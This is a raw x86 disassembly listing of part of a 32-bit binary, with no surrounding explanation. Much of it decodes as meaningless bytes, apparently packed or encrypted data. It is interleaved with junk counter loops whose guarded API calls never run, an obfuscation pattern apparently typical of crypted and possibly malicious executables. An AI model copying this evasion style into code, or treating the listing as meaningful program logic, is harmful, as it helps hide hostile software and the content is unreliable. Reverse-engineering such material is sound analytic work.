  40ec3a:	ror    dh,cl
  40ec3c:	ja     0x40ec9f
  40ec3e:	jg     0x40ec30
  40ec40:	into   
  40ec41:	in     eax,dx
  40ec42:	add    ebx,DWORD PTR [edi+ebx*2-0x7]
  40ec46:	daa    
  40ec47:	inc    ecx
  40ec48:	xor    DWORD PTR [eax-0x42],edx
  40ec4b:	dec    edi
  40ec4c:	gs jo  0x40eca8
  40ec4f:	pop    edx
  40ec50:	mov    bl,0xf3
  40ec52:	dec    edi
  40ec53:	jl     0x40ebfd
  40ec55:	outs   dx,BYTE PTR ds:[esi]
  40ec56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec57:	mov    dl,0x41
  40ec59:	es mov ah,0x9a
  40ec5c:	add    esp,ebx
  40ec5e:	loop   0x40ec4d
  40ec60:	jge    0x40ec4b
  40ec62:	push   cs
  40ec63:	dec    ebp
  40ec64:	jge    0x40ebfe
  40ec66:	rcr    dh,0x57
  40ec69:	xlat   BYTE PTR ds:[ebx]
  40ec6a:	lahf   
  40ec6b:	adc    bl,cl
  40ec6d:	jae    0x40ec0f
  40ec6f:	test   BYTE PTR [esi],dl
  40ec71:	ss mov cs,edx
  40ec74:	(bad)  
  40ec75:	int3   
  40ec76:	ins    BYTE PTR es:[edi],dx
  40ec77:	or     al,0x51
  40ec79:	pushf  
  40ec7a:	mov    fs,WORD PTR [edi+0x6899f75d]
  40ec80:	jmp    0x40ecc1
  40ec82:	inc    eax
  40ec83:	dec    eax
  40ec84:	cli    
  40ec85:	adc    esi,ebp
  40ec87:	dec    esi
  40ec88:	cld    
  40ec89:	test   DWORD PTR [edx],esi
  40ec8b:	dec    edi
  40ec8c:	jmp    0x609df956
  40ec91:	cmc    
  40ec92:	jne    0x40ecd8
  40ec94:	push   edx
  40ec95:	adc    BYTE PTR [ecx+0x558b5662],dl
  40ec9b:	or     BYTE PTR [ebx],cl
  40ec9d:	or     eax,0x42a77d
  40eca2:	mov    DWORD PTR [ebp-0x40],eax
  40eca5:	mov    eax,0x7510850
  40ecaa:	xor    edx,eax
  40ecac:	add    edi,0x2fd0
  40ecb2:	mov    ecx,0x327298
  40ecb7:	mov    DWORD PTR ds:0x42a879,0x17
  40ecc1:	cmp    DWORD PTR ds:0x42a879,0x0
  40ecc8:	je     0x40ed80
  40ecce:	cmp    DWORD PTR ds:0x42a879,0x5
  40ecd5:	jne    0x40ecf1
  40ecdb:	push   DWORD PTR [ebp-0x1c]
  40ecde:	push   0x65c1
  40ece3:	push   DWORD PTR [ebp-0x20]
  40ece6:	push   0x6120
  40eceb:	call   DWORD PTR ds:0x41d254
  40ecf1:	cmp    DWORD PTR ds:0x42a879,0x6
  40ecf8:	jne    0x40ed0b
  40ecfe:	mov    edi,DWORD PTR ds:0x42a879
  40ed04:	dec    edi
  40ed05:	mov    DWORD PTR ds:0x42a879,edi
  40ed0b:	mov    edi,DWORD PTR ds:0x42a879
  40ed11:	dec    edi
  40ed12:	mov    DWORD PTR ds:0x42a879,edi
  40ed18:	jmp    0x40ecc1
  40ed1d:	and    DWORD PTR ds:0x42a885,0x0
  40ed27:	mov    edi,DWORD PTR ds:0x42a885
  40ed2d:	inc    edi
  40ed2e:	mov    DWORD PTR ds:0x42a885,edi
  40ed34:	cmp    DWORD PTR ds:0x42a885,0x5
  40ed3b:	jne    0x40ed53
  40ed41:	push   DWORD PTR [ebp-0xc]
  40ed44:	push   DWORD PTR [ebp-0xc]
  40ed47:	push   DWORD PTR [ebp-0x18]
  40ed4a:	push   DWORD PTR [ebp-0x14]
  40ed4d:	call   DWORD PTR ds:0x41d1a4
  40ed53:	cmp    DWORD PTR ds:0x42a885,0x4
  40ed5a:	jne    0x40ed6d
  40ed60:	mov    edi,DWORD PTR ds:0x42a885
  40ed66:	inc    edi
  40ed67:	mov    DWORD PTR ds:0x42a885,edi
  40ed6d:	cmp    DWORD PTR ds:0x42a885,0x1f
  40ed74:	jb     0x40ed27
  40ed7a:	add    edi,DWORD PTR ds:0x42a7fd
  40ed80:	add    edx,ecx
  40ed82:	mov    edi,DWORD PTR ds:0x42a7f1
  40ed88:	xor    DWORD PTR ds:0x42a875,edi
  40ed8e:	jmp    0x40f016
  40ed93:	retf   0xc5c0
  40ed96:	ror    cl,0xc5
  40ed99:	leave  
  40ed9a:	retf   0x1a17
  40ed9d:	push   edx
  40ed9e:	xchg   edx,eax
  40ed9f:	mov    ebx,0x617a0779
  40eda4:	mov    edi,0x7ee57878
  40eda9:	js     0x40ee23
  40edab:	pop    ecx
  40edac:	rol    BYTE PTR [edx+0x46a971f3],0xcb
  40edb3:	mov    esi,0x9e416754
  40edb8:	fistp  WORD PTR [ebx]
  40edba:	mov    al,ds:0x9c6ec047
  40edbf:	icebp  
  40edc0:	or     BYTE PTR [ecx-0xbe50295],0x6e
  40edc7:	xchg   ecx,eax
  40edc8:	sub    BYTE PTR [ebx-0x6b752158],bl
  40edce:	test   BYTE PTR ds:0x335a57eb,ah
  40edd4:	or     DWORD PTR [ecx-0x33],0xabfd020a
  40eddb:	jmp    0x40ed72
  40eddd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edde:	scas   al,BYTE PTR es:[edi]
  40eddf:	jnp    0x40edc7
  40ede1:	mov    bl,0xb
  40ede3:	and    ecx,ebx
  40ede5:	cld    
  40ede6:	pop    ebx
  40ede7:	mov    esi,0x308b9209
  40edec:	xor    ecx,DWORD PTR [ebx+ebp*8+0x356a8a1]
  40edf3:	addr16 das 
  40edf5:	cmp    BYTE PTR [esi],bl
  40edf7:	shl    BYTE PTR [ecx+0x3e],0xf7
  40edfb:	dec    ecx
  40edfc:	sub    ecx,DWORD PTR ds:0x7d324bff
  40ee02:	and    eax,0xbb48cea0
  40ee07:	mov    ecx,0xb7788e69
  40ee0c:	mov    edi,edx
  40ee0e:	pop    ebp
  40ee0f:	and    eax,0x6cfc8490
  40ee14:	shl    BYTE PTR [ecx-0x43158a2b],1
  40ee1a:	mov    eax,ds:0xc22d02c6
  40ee1f:	in     eax,dx
  40ee20:	adc    al,0x87
  40ee22:	out    0xef,al
  40ee24:	lods   eax,DWORD PTR ds:[esi]
  40ee25:	mov    ch,0xdf
  40ee28:	jo     0x40eea3
  40ee2a:	lock mov al,0x8e
  40ee2d:	lods   eax,DWORD PTR ds:[esi]
  40ee2e:	stos   DWORD PTR es:[edi],eax
  40ee2f:	push   es
  40ee30:	(bad)  
  40ee31:	out    0xa7,al
  40ee33:	fisubr DWORD PTR [eax+0x15]
  40ee36:	mov    edi,0xd8725c48
  40ee3b:	xchg   sp,ax
  40ee3d:	fwait
  40ee3e:	retf   0x1116
  40ee41:	test   eax,0x7fcbe3da
  40ee46:	fisub  WORD PTR [esi]
  40ee48:	pop    ds
  40ee49:	(bad)  
  40ee4a:	(bad)  
  40ee4b:	pop    edi
  40ee4c:	adc    eax,0x5b963623
  40ee51:	jne    0x40eeb9
  40ee53:	in     eax,0x51
  40ee55:	test   eax,0xe54139ce
  40ee5a:	mov    bl,0x9a
  40ee5c:	(bad)  
  40ee5e:	jmp    0xd9be:0x42e3eeff
  40ee65:	(bad)  
  40ee66:	pushf  
  40ee67:	inc    ebp
  40ee68:	hlt    
  40ee69:	iret   
  40ee6a:	cmp    edi,DWORD PTR [edi]
  40ee6c:	adc    dh,dh
  40ee6e:	fstp   QWORD PTR [edi+0x4c]
  40ee71:	mov    ebp,0xf5a302f5
  40ee76:	ficom  DWORD PTR [eax-0x76]
  40ee79:	dec    ecx
  40ee7a:	and    al,0xaf
  40ee7c:	xlat   BYTE PTR ds:[ebx]
  40ee7d:	or     dl,dh
  40ee7f:	popa   
  40ee80:	fsubr  QWORD PTR [ebx+ecx*4+0x142433c3]
  40ee87:	test   al,dl
  40ee89:	fwait
  40ee8a:	dec    esp
  40ee8b:	push   eax
  40ee8c:	xchg   ecx,eax
  40ee8d:	sub    dl,al
  40ee8f:	das    
  40ee90:	pop    edx
  40ee91:	dec    ebx
  40ee92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee93:	ins    DWORD PTR es:[edi],dx
  40ee94:	pop    edx
  40ee95:	fidivr DWORD PTR [esi+0x20]
  40ee98:	add    DWORD PTR [ebx+0x173f4ac7],eax
  40ee9e:	arpl   di,di
  40eea0:	dec    edi
  40eea1:	or     ah,BYTE PTR [esi]
  40eea3:	xchg   ebx,eax
  40eea4:	and    edx,ecx
  40eea6:	fs xchg ebp,eax
  40eea8:	sub    DWORD PTR [eax],edx
  40eeaa:	ds cld 
  40eeac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eead:	dec    eax
  40eeae:	pop    ebx
  40eeaf:	ins    DWORD PTR es:[edi],dx
  40eeb0:	mov    bh,bl
  40eeb2:	or     al,0x4b
  40eeb4:	fwait
  40eeb5:	mov    di,0xe485
  40eeb9:	(bad)  
  40eeba:	dec    edx
  40eebb:	xor    cl,BYTE PTR [ebx]
  40eebd:	mov    eax,edi
  40eebf:	mov    ?,edx
  40eec1:	cmp    al,0x4b
  40eec3:	sar    DWORD PTR [edi+0x24936b50],cl
  40eec9:	sti    
  40eeca:	mov    bl,0x38
  40eecc:	stos   BYTE PTR es:[edi],al
  40eecd:	pop    edx
  40eece:	call   0x70d34849
  40eed3:	jle    0x40ef32
  40eed5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eed6:	div    ebp
  40eed8:	or     DWORD PTR [edx],ecx
  40eeda:	push   0x1fcc0dcb
  40eedf:	clc    
  40eee0:	rcr    DWORD PTR [edx+0x86567bd],1
  40eee6:	mov    BYTE PTR [esi],al
  40eee8:	in     eax,0x52
  40eeea:	int3   
  40eeeb:	clc    
  40eeec:	xchg   ecx,eax
  40eeed:	add    bh,bh
  40eeef:	mov    ch,0x2e
  40eef1:	jecxz  0x40eeaa
  40eef3:	jne    0x40ef22
  40eef5:	icebp  
  40eef6:	mov    BYTE PTR [edx],dh
  40eef8:	jae    0x40ee84
  40eefa:	scas   eax,DWORD PTR es:[edi]
  40eefb:	sbb    eax,0xa7baf42b
  40ef00:	retf   0x4852
  40ef03:	jecxz  0x40eed2
  40ef05:	dec    esi
  40ef06:	out    0x43,al
  40ef08:	mov    edi,0x1168054d
  40ef0d:	mov    esp,0x4aad37c
  40ef12:	push   0xf388d16c
  40ef17:	push   ss
  40ef18:	xchg   esp,eax
  40ef19:	outs   dx,DWORD PTR ds:[esi]
  40ef1a:	aas    
  40ef1b:	scas   eax,DWORD PTR es:[edi]
  40ef1c:	cmp    ebx,eax
  40ef1e:	sub    ah,al
  40ef20:	add    eax,0x17f95a24
  40ef25:	jle    0x40ef4c
  40ef27:	xor    ch,cl
  40ef29:	out    dx,al
  40ef2a:	test   BYTE PTR ds:0x70f35c1e,ch
  40ef30:	out    dx,al
  40ef31:	sub    eax,0xa9413055
  40ef36:	pop    es
  40ef37:	add    DWORD PTR [edi-0x30c4693b],0xffffffd5
  40ef3e:	fld    QWORD PTR [eax+0x5d34d8fc]
  40ef44:	or     ebp,DWORD PTR [eax]
  40ef46:	icebp  
  40ef47:	pusha  
  40ef48:	loope  0x40efb5
  40ef4a:	dec    esp
  40ef4b:	je     0x40eef7
  40ef4d:	xchg   ecx,eax
  40ef4e:	dec    ecx
  40ef4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef50:	mov    ds:0xfa1c1e12,al
  40ef55:	xor    eax,0xd611e3f9
  40ef5a:	shr    DWORD PTR [esi+eiz*1],1
  40ef5d:	jb     0x40ef6d
  40ef5f:	cmp    bl,bl
  40ef61:	or     BYTE PTR [eax],0xaf
  40ef64:	std    
  40ef65:	jle    0x40efd0
  40ef67:	jns    0x40ef6a
  40ef69:	dec    esi
  40ef6a:	cmp    BYTE PTR [edx],dh
  40ef6c:	icebp  
  40ef6d:	push   es
  40ef6e:	pop    ss
  40ef6f:	cld    
  40ef70:	retf   
  40ef71:	xchg   ecx,eax
  40ef72:	(bad)  
  40ef73:	repnz fldenv [ecx-0x23]
  40ef77:	jge    0x40efca
  40ef79:	adc    eax,0x42e3b548
  40ef7e:	out    dx,eax
  40ef7f:	push   ss
  40ef80:	jecxz  0x40efc3
  40ef82:	popf   
  40ef83:	pop    ds
  40ef84:	sbb    ebx,edi
  40ef86:	outs   dx,DWORD PTR ds:[esi]
  40ef87:	out    0xe0,al
  40ef89:	(bad)  
  40ef8b:	mov    WORD PTR [eax+0x2a],gs
  40ef8e:	pop    edx
  40ef8f:	cmp    BYTE PTR [ecx-0x1e],al
  40ef92:	in     eax,dx
  40ef93:	cmp    eax,DWORD PTR [ebx+0x2c]
  40ef96:	xchg   DWORD PTR [edi-0x7e50ac33],esp
  40ef9c:	inc    ebp
  40ef9d:	popf   
  40ef9e:	scas   eax,DWORD PTR es:[edi]
  40ef9f:	stos   DWORD PTR es:[edi],eax
  40efa0:	lahf   
  40efa1:	cwde   
  40efa2:	mov    ebp,0x896a551f
  40efa7:	fsubrp st(3),st
  40efa9:	or     DWORD PTR [ebp-0x3e2327f6],ebp
  40efaf:	cmp    ch,bh
  40efb1:	in     al,dx
  40efb2:	xchg   BYTE PTR [edi-0x5b03bbdd],ch
  40efb8:	loope  0x40ef5f
  40efba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efbb:	sub    BYTE PTR [edx],dh
  40efbd:	xchg   ecx,eax
  40efbe:	arpl   WORD PTR [ecx+0x236f64d8],cx
  40efc4:	out    0xa0,eax
  40efc6:	jno    0x40efe3
  40efc8:	dec    esp
  40efc9:	neg    DWORD PTR [ebx+0x2e]
  40efcc:	aad    0x17
  40efce:	mov    ch,0x3b
  40efd0:	scas   al,BYTE PTR es:[edi]
  40efd1:	clc    
  40efd2:	push   esp
  40efd3:	or     esp,esi
  40efd5:	in     eax,0x4f
  40efd7:	fwait
  40efd8:	(bad)  
  40efda:	pop    edi
  40efdb:	mov    edi,0x90499114
  40efe0:	test   DWORD PTR [eax-0x2d],edi
  40efe3:	mov    ds:0x2f3711b8,eax
  40efe8:	not    DWORD PTR [esp+ebp*2+0x40]
  40efec:	test   BYTE PTR [eax-0x1e2ea355],ah
  40eff2:	inc    ebp
  40eff3:	iret   
  40eff4:	push   eax
  40eff5:	adc    eax,0xca48695b
  40effa:	add    dh,BYTE PTR [ecx-0x16fde56b]
  40f000:	push   ss
  40f001:	pop    esp
  40f002:	cmp    eax,DWORD PTR [edi+0x3e]
  40f005:	cs pop es
  40f007:	and    edx,edx
  40f009:	mov    dl,0x82
  40f00b:	jge    0x40efcd
  40f00d:	ror    BYTE PTR [ebx],cl
  40f00f:	ret    
  40f010:	pushf  
  40f011:	mov    bl,0x58
  40f013:	mov    bh,0x53
  40f015:	cwde   
  40f016:	mov    DWORD PTR [ebp-0x8],edx
  40f019:	and    DWORD PTR ds:0x42a801,0x0
  40f023:	xor    edi,edi
  40f025:	add    edi,DWORD PTR ds:0x42a801
  40f02b:	inc    edi
  40f02c:	mov    DWORD PTR ds:0x42a801,edi
  40f032:	cmp    DWORD PTR ds:0x42a801,0xa
  40f039:	jne    0x40f04a
  40f03f:	push   0x23fa
  40f044:	call   DWORD PTR ds:0x41d0d0
  40f04a:	cmp    DWORD PTR ds:0x42a801,0x9
  40f051:	jne    0x40f066
  40f057:	xor    edi,edi
  40f059:	or     edi,DWORD PTR ds:0x42a801
  40f05f:	inc    edi
  40f060:	mov    DWORD PTR ds:0x42a801,edi
  40f066:	cmp    DWORD PTR ds:0x42a801,0x10
  40f06d:	jb     0x40f023
  40f073:	and    edi,edi
  40f075:	mov    edx,DWORD PTR [ebp+0x8]
  40f078:	and    DWORD PTR ds:0x42a88d,0x0
  40f082:	mov    edi,DWORD PTR ds:0x42a88d
  40f088:	inc    edi
  40f089:	mov    DWORD PTR ds:0x42a88d,edi
  40f08f:	cmp    DWORD PTR ds:0x42a88d,0x29
  40f096:	jne    0x40f0ac
  40f09c:	push   0x42a805
  40f0a1:	push   0x4a20
  40f0a6:	call   DWORD PTR ds:0x41d0d4
  40f0ac:	cmp    DWORD PTR ds:0x42a88d,0x1f
  40f0b3:	jb     0x40f082
  40f0b9:	and    DWORD PTR ds:0x42a759,0x6b84
  40f0c3:	xor    edx,eax
  40f0c5:	jmp    0x40f34d
  40f0ca:	enter  0xcbc4,0xc2
  40f0ce:	fcmovnb st,st(1)
  40f0d0:	aad    0xda
  40f0d2:	push   cs
  40f0d3:	and    al,0x97
  40f0d5:	cmp    al,0x6b
  40f0d7:	xchg   edi,eax
  40f0d8:	dec    edi
  40f0d9:	mov    ds:0x7878bcce,eax
  40f0de:	in     eax,0x7e
  40f0e0:	js     0x40f15a
  40f0e2:	(bad)  
  40f0e3:	mov    al,0xea
  40f0e5:	arpl   ax,di
  40f0e7:	repnz add al,0x24
  40f0ea:	retf   0x6e57
  40f0ed:	adc    eax,0x9dfaf24e
  40f0f2:	addr16 inc esi
  40f0f4:	xlat   BYTE PTR ds:[ebx]
  40f0f5:	mov    cl,0x15
  40f0f7:	repz push ss
  40f0f9:	stos   DWORD PTR es:[edi],eax
  40f0fa:	push   es
  40f0fb:	aam    0xf6
  40f0fd:	xchg   esp,eax
  40f0fe:	fadd   DWORD PTR [edi-0x84c030c]
  40f104:	sbb    DWORD PTR [edi],0x5d
  40f107:	jmp    0x93f5549d
  40f10c:	fldz   
  40f10e:	(bad)  [edi+edx*4+0x561936e5]
  40f115:	push   ds
  40f116:	add    ebx,DWORD PTR [ebx]
  40f118:	cs inc esp
  40f11a:	xor    eax,0x3f1b5996
  40f11f:	pop    ss
  40f120:	outs   dx,BYTE PTR ds:[esi]
  40f121:	inc    ecx
  40f122:	repz xor eax,esp
  40f125:	cmc    
  40f126:	ror    DWORD PTR [edi-0x386db54],0x7e
  40f12d:	ficom  WORD PTR [edi-0x2b]
  40f130:	hlt    
  40f131:	xchg   ebx,eax
  40f132:	mov    eax,0xcb8f58db
  40f137:	push   eax
  40f138:	loopne 0x40f193
  40f13a:	clc    
  40f13b:	fucomip st,st(2)
  40f13d:	push   ss
  40f13e:	cmp    eax,0xf6baad44
  40f143:	repnz adc dl,BYTE PTR ds:0x987bf716
  40f14a:	addr16 je 0x40f163
  40f14d:	cmp    edi,esp
  40f14f:	jp     0x40f0ec
  40f151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f152:	mov    ebp,0x8f8ec62d
  40f157:	mov    bl,0xa2
  40f159:	sub    BYTE PTR [ecx+ecx*1],bl
  40f15c:	in     al,0xec
  40f15e:	jbe    0x40f1da
  40f160:	imul   edi,DWORD PTR ds:0x3f26ced3,0x4d8f5a75
  40f16a:	xchg   esi,eax
  40f16b:	mov    dh,0x74
  40f16d:	in     al,dx
  40f16e:	das    
  40f16f:	adc    BYTE PTR [ebx+0x13],ah
  40f172:	pusha  
  40f173:	pop    ecx
  40f174:	mov    edi,0xf3a1101a
  40f179:	cmp    eax,0xa9a7e677
  40f17e:	lahf   
  40f17f:	mov    dl,0xd9
  40f181:	pop    esp
  40f182:	jp     0x40f14c
  40f184:	add    esp,DWORD PTR [ebp+0x147d072b]
  40f18a:	sbb    ch,BYTE PTR [ecx+0x3b18aeeb]
  40f190:	inc    edi
  40f191:	test   al,0x39
  40f193:	or     BYTE PTR [edi-0x35],cl
  40f196:	pop    esp
  40f197:	retf   
  40f198:	mov    bh,0xe5
  40f19a:	jbe    0x40f202
  40f19c:	push   es
  40f19d:	inc    DWORD PTR [edx-0x3e]
  40f1a0:	sar    bl,0x3
  40f1a3:	adc    ebx,ecx
  40f1a5:	jp     0x40f1d8
  40f1a7:	push   0xffffff88
  40f1a9:	pop    eax
  40f1aa:	jmp    0x40f208
  40f1ac:	inc    edx
  40f1ad:	xor    edx,ebx
  40f1af:	ror    BYTE PTR [edx+edx*1],cl
  40f1b2:	stos   DWORD PTR es:[edi],eax
  40f1b3:	out    dx,eax
  40f1b4:	leave  
  40f1b5:	push   eax
  40f1b6:	add    eax,0x45fe3511
  40f1bb:	xchg   BYTE PTR [ebx+edi*8-0x16],al
  40f1bf:	jns    0x40f19c
  40f1c1:	jg     0x40f170
  40f1c3:	stos   BYTE PTR es:[edi],al
  40f1c4:	xor    DWORD PTR [edi+0x3d14d4d8],eax
  40f1ca:	sbb    BYTE PTR [edx-0x4c],0x3e
  40f1ce:	fcomp  DWORD PTR [ebp-0x3c]
  40f1d1:	adc    al,BYTE PTR [eax+0x55]
  40f1d4:	fwait
  40f1d5:	xor    dh,BYTE PTR [bp+si]
  40f1d8:	jp     0x40f1ac
  40f1da:	xor    esi,ebx
  40f1dc:	jp     0x40f205
  40f1de:	repnz inc eax
  40f1e0:	popf   
  40f1e1:	jmp    esi
  40f1e3:	sub    BYTE PTR [ebx],ch
  40f1e5:	add    bh,ah
  40f1e7:	psllw  mm6,QWORD PTR [edi]
  40f1ea:	mov    esp,0x27b84164
  40f1ef:	imul   ebp,DWORD PTR [ebx-0x5e],0xffffffd7
  40f1f3:	adc    DWORD PTR [ebp-0x11],ebp
  40f1f6:	ins    DWORD PTR es:[edi],dx
  40f1f7:	dec    ebp
  40f1f8:	sbb    ecx,ebp
  40f1fa:	mov    edx,0x4ffa3bcb
  40f1ff:	jo     0x40f200
  40f201:	and    eax,0x3dfe3ad
  40f206:	mov    al,0x38
  40f208:	xchg   ebx,eax
  40f209:	and    BYTE PTR [ecx],0x93
  40f20c:	clc    
  40f20d:	loop   0x40f23e
  40f20f:	sar    DWORD PTR [ebx+0x358c712d],cl
  40f215:	pop    edx
  40f216:	ret    0xe98d
  40f219:	pop    si
  40f21b:	cld    
  40f21c:	in     al,dx
  40f21d:	stc    
  40f21e:	adc    dh,BYTE PTR [ebx-0x5b35ce62]
  40f224:	leave  
  40f225:	adc    bh,bl
  40f227:	adc    bl,cl
  40f229:	stos   DWORD PTR es:[edi],eax
  40f22a:	imul   DWORD PTR [esp+ecx*1-0x14d97db5]
  40f231:	fs add eax,ebp
  40f234:	mov    ch,0x62
  40f236:	nop
  40f237:	loope  0x40f1da
  40f239:	mov    bl,0x5b
  40f23b:	in     eax,0x54
  40f23d:	add    ah,BYTE PTR [esi-0x7752dc84]
  40f243:	out    dx,al
  40f244:	fisttp WORD PTR gs:[esi+0x30ccbe7]
  40f24b:	clc    
  40f24c:	push   0x623c0c41
  40f251:	mov    ebx,0x1876766e
  40f256:	sub    DWORD PTR [ebp+0x5c36da4e],edx
  40f25c:	dec    ebp
  40f25d:	psubq  mm0,QWORD PTR [ecx-0x5e3bf6de]
  40f264:	js     0x40f29d
  40f266:	rcr    BYTE PTR [esp],cl
  40f269:	jecxz  0x40f244
  40f26b:	les    ecx,FWORD PTR [edi]
  40f26d:	data16 mov bh,BYTE PTR [esi]
  40f270:	leave  
  40f271:	push   es
  40f272:	mov    ebp,0x2a92eb3b
  40f277:	retf   
  40f278:	add    ch,BYTE PTR [eax*1+0x2567a7fc]
  40f27f:	cdq    
  40f280:	je     0x40f291
  40f282:	imul   ebp,DWORD PTR [eax+0xe],0xf8f30f4
  40f289:	fld    QWORD PTR [ecx+edi*1]
  40f28c:	outs   dx,DWORD PTR ds:[esi]
  40f28d:	inc    ecx
  40f28e:	leave  
  40f28f:	sbb    al,0x54
  40f291:	dec    edx
  40f292:	pusha  
  40f293:	add    DWORD PTR [ecx+0x1],0x81e412e8
  40f29a:	or     bl,BYTE PTR [edi]
  40f29c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f29d:	test   DWORD PTR [ebx-0x51506e6b],eax
  40f2a3:	xlat   BYTE PTR ds:[ebx]
  40f2a4:	and    al,0xe7
  40f2a6:	xor    DWORD PTR [edx+0x3f],0xffffff96
  40f2aa:	xchg   ebx,eax
  40f2ab:	pop    ecx
  40f2ac:	or     eax,0x3be167ac
  40f2b1:	xchg   esi,esi
  40f2b3:	cmp    eax,0x2a16c04e
  40f2b8:	jmp    0x6d64:0x439231e2
  40f2bf:	xchg   ecx,eax
  40f2c0:	inc    esi
  40f2c1:	jle    0x40f26e
  40f2c3:	mov    esi,ebp
  40f2c5:	inc    esp
  40f2c6:	fiadd  WORD PTR ds:0xe837ee3e
  40f2cc:	pop    edi
  40f2cd:	mov    bh,0x0
  40f2cf:	push   cs
  40f2d0:	dec    esp
  40f2d1:	rcr    BYTE PTR [edx+0x1c],0xa6
  40f2d5:	xor    BYTE PTR [esi+edi*8-0x47],0x8c
  40f2da:	enter  0xaf4f,0x6c
  40f2de:	sub    edi,esp
  40f2e0:	and    al,0x55
  40f2e2:	pushf  
  40f2e3:	add    al,BYTE PTR ds:0x4b1b552
  40f2e9:	pop    edi
  40f2ea:	xlat   BYTE PTR ds:[ebx]
  40f2eb:	mov    ebx,0xeb3d2b0b
  40f2f0:	adc    esp,DWORD PTR [edx-0x5b89a455]
  40f2f6:	int    0xa5
  40f2f8:	cld    
  40f2f9:	or     DWORD PTR [ecx],ecx
  40f2fb:	or     DWORD PTR [edi-0x58317af1],esp
  40f301:	ins    BYTE PTR es:[edi],dx
  40f302:	fs dec esi
  40f304:	dec    edx
  40f305:	dec    esp
  40f306:	pop    es
  40f307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f308:	jbe    0x40f2d0
  40f30a:	xor    cl,BYTE PTR [ebx+0x66]
  40f30d:	shl    BYTE PTR ds:0x774ea5ec,1
  40f313:	adc    ah,BYTE PTR [ebx+0x7a1ef2e8]
  40f319:	mov    WORD PTR [eax+0x125006b7],ss
  40f31f:	mov    ebp,0x603c77c0
  40f324:	scas   eax,DWORD PTR es:[edi]
  40f325:	cmp    BYTE PTR [edx+edi*4-0x4],dh
  40f329:	dec    esi
  40f32a:	idiv   ecx
  40f32c:	fidivr DWORD PTR [ebp+0x7754231f]
  40f332:	jne    0x40f30b
  40f334:	jmp    0x7f20:0xa8aa6b87
  40f33b:	cmp    DWORD PTR [edi+0x27],esi
  40f33e:	mov    cl,0x0
  40f340:	jne    0x40f2de
  40f342:	out    0x3f,eax
  40f344:	dec    esi
  40f345:	pop    esp
  40f346:	scas   eax,DWORD PTR es:[edi]
  40f347:	ret    
  40f348:	adc    ch,BYTE PTR [esi+0x3f49681]
  40f34e:	rol    edi,1
  40f350:	add    eax,0x42a80d
  40f355:	sbb    eax,0x83000000
  40f35a:	cmp    eax,0x42a80d
  40f35f:	add    BYTE PTR [edi],cl
  40f361:	test   BYTE PTR [ebp+0x0],bl
  40f364:	add    BYTE PTR [eax],al
  40f366:	cmp    DWORD PTR ds:0x42a80d,0x7
  40f36d:	jne    0x40f389
  40f373:	push   DWORD PTR [ebp-0x20]
  40f376:	push   DWORD PTR [ebp-0x14]
  40f379:	push   0x7b1d
  40f37e:	push   0x2bb5
  40f383:	call   DWORD PTR ds:0x41d258
  40f389:	cmp    DWORD PTR ds:0x42a80d,0x8
  40f390:	jne    0x40f3a3
  40f396:	mov    edi,DWORD PTR ds:0x42a80d
  40f39c:	dec    edi
  40f39d:	mov    DWORD PTR ds:0x42a80d,edi
  40f3a3:	mov    edi,DWORD PTR ds:0x42a80d
  40f3a9:	dec    edi
  40f3aa:	mov    DWORD PTR ds:0x42a80d,edi
  40f3b0:	jmp    0x40f359
  40f3b5:	xor    edi,edi
  40f3b7:	add    edi,DWORD PTR ds:0x42a759
  40f3bd:	add    DWORD PTR ds:0x42a775,edi
  40f3c3:	mov    DWORD PTR [ebp+0xc],edx
  40f3c6:	xor    edx,DWORD PTR ds:0x42a769
  40f3cc:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  40f3d3:	or     edx,edx
  40f3d5:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  40f3dc:	and    DWORD PTR ds:0x42a841,0x0
  40f3e6:	jmp    0x40f3f8
  40f3eb:	mov    edx,DWORD PTR ds:0x42a841
  40f3f1:	inc    edx
  40f3f2:	mov    DWORD PTR ds:0x42a841,edx
  40f3f8:	cmp    DWORD PTR ds:0x42a841,0x12
  40f3ff:	jae    0x40f427
  40f405:	cmp    DWORD PTR ds:0x42a841,0x14
  40f40c:	jne    0x40f420
  40f412:	push   0x4578
  40f417:	push   DWORD PTR [ebp-0x14]
  40f41a:	call   DWORD PTR ds:0x41d25c
  40f420:	jmp    0x40f3eb
  40f425:	and    edi,edi
  40f427:	mov    DWORD PTR [ebp-0x2c],0xf89c853b
  40f42e:	sub    edi,DWORD PTR ds:0x42a879
  40f434:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  40f43b:	and    edi,0x6695
  40f441:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  40f448:	or     DWORD PTR ds:0x42a775,0x61f4
  40f452:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  40f459:	and    DWORD PTR ds:0x42a809,0x0
  40f463:	jmp    0x40f477
  40f468:	xor    edx,edx
  40f46a:	xor    edx,DWORD PTR ds:0x42a809
  40f470:	inc    edx
  40f471:	mov    DWORD PTR ds:0x42a809,edx
  40f477:	cmp    DWORD PTR ds:0x42a809,0x11
  40f47e:	jae    0x40f4ac
  40f484:	cmp    DWORD PTR ds:0x42a809,0x1a
  40f48b:	jne    0x40f4a7
  40f491:	push   0x1
  40f493:	push   DWORD PTR [ebp-0xc]
  40f496:	push   DWORD PTR [ebp-0x20]
  40f499:	push   0x1352
  40f49e:	push   DWORD PTR [ebp-0x18]
  40f4a1:	call   DWORD PTR ds:0x41d0d8
  40f4a7:	jmp    0x40f468
  40f4ac:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40f4b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f4b6:	xor    edx,eax
  40f4b8:	mov    DWORD PTR ds:0x42a7c9,0x16
  40f4c2:	cmp    DWORD PTR ds:0x42a7c9,0x0
  40f4c9:	je     0x40f553
  40f4cf:	cmp    DWORD PTR ds:0x42a7c9,0x21
